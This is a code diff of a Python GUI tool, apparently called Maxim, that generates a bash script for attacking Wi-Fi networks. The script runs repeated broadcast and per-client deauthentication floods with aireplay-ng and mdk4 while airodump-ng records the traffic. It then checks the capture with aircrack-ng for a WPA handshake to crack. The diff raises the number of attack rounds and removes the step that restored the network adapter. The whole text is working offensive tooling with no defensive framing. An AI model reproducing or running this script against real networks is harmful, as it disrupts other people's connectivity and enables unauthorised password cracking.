@@ -1395,28 +1395,28 @@ class MaximWindow(QMainWindow):
         # ═══════════════════════════════════════════════════════════
         script.write("if [ -z \"$HANDSHAKE_GOT\" ]; then\n")
         script.write("  echo 'Method 2: Deauth + handshake capture...'\n")
-        # Start airodump
+        # Start airodump in background
         script.write(f"  sudo airodump-ng -c $CHANNEL --bssid $BSSID -w \"$CAPTURE_DIR/{safe_essid}\" --output-format pcap,csv {iface} &>/dev/null &\n")
         script.write("  AIRODUMP_PID=$!\n")
-        script.write("  sleep 2\n")
+        script.write("  sleep 3\n")
         script.write("  echo 'Executing Deauth...'\n")
-        script.write("  for ROUND in $(seq 1 20); do\n")
-        # Broadcast deauth
-        script.write(f"    sudo aireplay-ng --deauth 500 -a $BSSID {iface} &>/dev/null &\n")
-        # Per-client
+        script.write("  for ROUND in $(seq 1 30); do\n")
+        # Broadcast deauth — visible output so we see if it actually sends packets
+        script.write(f"    sudo aireplay-ng --deauth 100 -a $BSSID {iface} 2>&1 | tail -3\n")
+        # Per-client targeted deauth
         script.write(f"    CAP_CSV=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.csv 2>/dev/null | head -1)\n")
         script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
         script.write("      for STA in $(grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"^$BSSID\" | grep -i \"$BSSID\" | cut -d, -f1 | tr -d ' ' | sort -u); do\n")
-        script.write(f"        sudo aireplay-ng --deauth 200 -a $BSSID -c $STA {iface} &>/dev/null &\n")
+        script.write(f"        echo \"  Deauth client: $STA\"\n")
+        script.write(f"        sudo aireplay-ng --deauth 50 -a $BSSID -c $STA {iface} 2>&1 | tail -2\n")
         script.write("      done\n")
         script.write("    fi\n")
         # mdk4
         script.write("    if command -v mdk4 >/dev/null 2>&1; then\n")
         script.write("      echo $BSSID > /tmp/maxim_mdk_target\n")
-        script.write(f"      sudo timeout 10 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL &>/dev/null &\n")
+        script.write(f"      sudo timeout 8 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL 2>&1 | tail -2\n")
         script.write("    fi\n")
-        script.write("    wait\n")
-        # Check handshake
+        # Check handshake after each round
         script.write(f"    CAP_FILE=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.cap 2>/dev/null | head -1)\n")
         script.write("    if [ -n \"$CAP_FILE\" ]; then\n")
         script.write("      if aircrack-ng \"$CAP_FILE\" 2>&1 | grep -i \"$BSSID\" | grep -qE '[1-9][0-9]* handshake'; then\n")
@@ -1426,7 +1426,7 @@ class MaximWindow(QMainWindow):
         script.write("      fi\n")
         script.write("    fi\n")
         script.write("  done\n")
-        script.write("  kill $AIRODUMP_PID 2>/dev/null; wait $AIRODUMP_PID 2>/dev/null\n")
+        script.write("  kill $AIRODUMP_PID 2>/dev/null\n")
         script.write("  sudo pkill -f 'aireplay-ng' 2>/dev/null\n")
         script.write("  sudo pkill -f 'mdk4' 2>/dev/null\n")
         script.write("fi\n\n")
@@ -1454,26 +1454,12 @@ class MaximWindow(QMainWindow):
         script.write("fi\n\n")
 
         script.write("if [ -z \"$HANDSHAKE_GOT\" ]; then\n")
-        script.write("  echo 'No handshake or PMKID captured after all methods.'\n")
+        script.write("  echo 'No handshake or PMKID captured.'\n")
         script.write(f"  echo 'FAILED' > '{signal_file}'\n")
         script.write("else\n")
         script.write(f"  echo 'DONE' > '{signal_file}'\n")
-        script.write("fi\n\n")
-        # Restore attack adapter to managed mode
-        script.write(f"\n# ═══ CLEANUP: restore {iface} to managed mode ═══\n")
-        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {iface} set type managed 2>/dev/null\n")
-        script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
-        script.write(f"echo '[OK] {iface} restored to managed mode'\n")
-        # Final guard: make sure protected adapter is still up
-        if keep_iface:
-            script.write(f"PSTATE=$(nmcli -t -f DEVICE,STATE device 2>/dev/null | grep \"^$PROTECTED_IFACE:\" | cut -d: -f2)\n")
-            script.write(f"if [ \"$PSTATE\" != \"connected\" ]; then\n")
-            script.write(f"  sudo nmcli device connect $PROTECTED_IFACE 2>/dev/null\n")
-            script.write(f"  echo '[GUARD] Reconnected $PROTECTED_IFACE'\n")
-            script.write(f"fi\n")
-        script.write(f"echo 'DONE' > '{signal_file}'\n")
-        script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
+        script.write("fi\n")
+        script.write("read -p 'Press Enter to close'\n")
 
         script.close()
         os.chmod(script.name, 0o755)
